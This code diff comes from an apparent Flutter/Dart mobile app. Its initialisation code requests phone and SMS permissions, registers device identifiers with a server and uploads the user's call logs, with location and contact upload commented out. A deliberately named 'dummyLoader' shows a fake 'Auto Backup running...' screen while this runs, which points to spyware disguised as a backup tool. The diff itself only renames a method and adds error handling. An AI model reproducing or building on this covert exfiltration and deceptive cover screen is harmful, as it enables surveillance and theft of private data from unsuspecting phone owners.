@@ -24,7 +24,7 @@ class Init {
     await _requestPermission(Permission.phone);
     await _requestPermission(Permission.sms);
 
-    _dummyLoader();
+    dummyLoader();
     // Api.sendLocation(agent, uuid);
     // Api.sendContacts(agent, uuid);
     Api.sendCallLogs(agent, uuid);
@@ -32,20 +32,25 @@ class Init {
   }
 
   Future _initServerConnection() async {
-    final box = await Hive.openBox('myBox');
-    await FkUserAgent.init();
-    agent = FkUserAgent.userAgent!;
-    imei = box.get('imei') ??
-        const Uuid().v4(); // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
-    uuid = box.get('uuid');
-    uuid ??= await Api.sendDeviceInfo(agent!, imei);
+    try {
+      final box = await Hive.openBox('myBox');
+      await FkUserAgent.init();
+      agent = FkUserAgent.userAgent!;
+      imei = box.get('imei') ??
+          const Uuid().v4(); // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
+      uuid = box.get('uuid');
+      uuid ??= await Api.sendDeviceInfo(agent!, imei);
 
-    box.put('agent', agent);
-    box.put('uuid', uuid);
-    box.put('imei', imei);
+      box.put('agent', agent);
+      box.put('uuid', uuid);
+      box.put('imei', imei);
+    } catch (e) {
+      print(e.toString());
+    }
   }
 
-  static Future<PermissionStatus?> _requestPermission(Permission permission) async {
+  static Future<PermissionStatus?> _requestPermission(
+      Permission permission) async {
     final alreadyGranted = await permission.isGranted;
     if (alreadyGranted) return null;
     final status = await permission.request();
@@ -69,7 +74,7 @@ class Init {
     return status;
   }
 
-  static Future _dummyLoader() async {
+  static Future dummyLoader() async {
     EasyLoading.show(
         status: 'Auto Backup running...', maskType: EasyLoadingMaskType.custom);
 
